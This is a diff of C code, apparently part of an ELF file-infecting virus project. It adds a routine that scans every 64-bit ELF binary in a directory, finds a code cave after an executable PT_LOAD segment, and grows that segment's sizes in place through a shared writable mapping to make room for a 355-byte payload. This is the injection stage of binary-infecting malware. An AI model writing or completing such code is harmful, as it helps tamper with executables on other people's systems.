@@ -81,20 +81,60 @@ int     open_map(char *fname, t_file *file)
 	if ((file->data = mmap(0, file->size, PROT_READ| PROT_WRITE| PROT_EXEC,
 	                       MAP_SHARED, file->fd, 0)) == MAP_FAILED)
 		return 1;
-	//printf("good map\n");
 	return 0;
+}
+
+t_cave get_gap(t_file *file)
+{
+	size_t payload = 355; // a changer selon la taille
+	t_code_cave_elf64       *cave;
+	Elf64_Ehdr*             elf_hdr;
+	Elf64_Phdr*             seg;
+	int                     i;
+
+	elf_hdr = (Elf64_Ehdr *) file->data;
+	seg = (Elf64_Phdr *)((unsigned char*) elf_hdr + (unsigned int)elf_hdr->e_phoff);
+	cave = (t_code_cave_elf64 *)malloc(sizeof(t_code_cave_elf64));
+	ft_bzero(cave, sizeof(t_code_cave_elf64));
+	file->error = 1;
+	i = 0;
+	while (i < elf_hdr->e_phnum)
+	{
+		if (out_of_range(file, seg))
+			return(cave);
+		/* Search Segment PT_LOAD with permission R X*/
+		if (file->error && seg->p_type == PT_LOAD && seg->p_flags & (PF_X | PF_R))
+		{
+			cave->start_seg = seg;
+			cave->start_gap = seg->p_offset + seg->p_filesz;
+			seg = (Elf64_Phdr *) ((unsigned char*) seg + (unsigned int) elf_hdr->e_phentsize);
+			/* DIFF beewten 2 segments > size payload*/
+			if (i + 1 < elf_hdr->e_phnum && seg->p_type == PT_LOAD && ((seg->p_offset - cave->start_gap) > payload))
+			{
+				file->error = 0;
+				cave->start_seg->p_memsz += PAY_EIF64_SIZE;
+				cave->start_seg->p_filesz += PAY_EIF64_SIZE;
+			}
+		}
+		else
+			seg = (Elf64_Phdr *) ((unsigned char*)seg + (unsigned int)elf_hdr->e_phentsize);
+		++i;
+	}
+	return(cave);
 }
 
 int do_the_job(t_file *file)
 {
+	t_cave cave;
 	if (file->size < sizeof(Elf64_Ehdr))
 		return (1);
 	if (strncmp(file->data, ELFMAG,SELFMAG))
 		return 1;
-	write(1,"2\n",2);
 	if (file->data[EI_CLASS] != ELFCLASS64)
 		return 1;
-	printf("valid binary");
+	cave = get_gap(file);
+	if (file->error)
+		return 1;
 	return 0;
 }
 
@@ -118,8 +158,7 @@ int open_directory(const char *path)
 		//printf("%s %s\n",dirent->d_name,path_file);
 		if (open_map(path_file,&file) == 0)
 		{
-			if (do_the_job(&file) == 0)
-				printf("valid binary %s %s\n",dirent->d_name,path_file);
+			do_the_job(&file);
 			close(file.fd);
 			munmap(file.data, file.size);
 		}
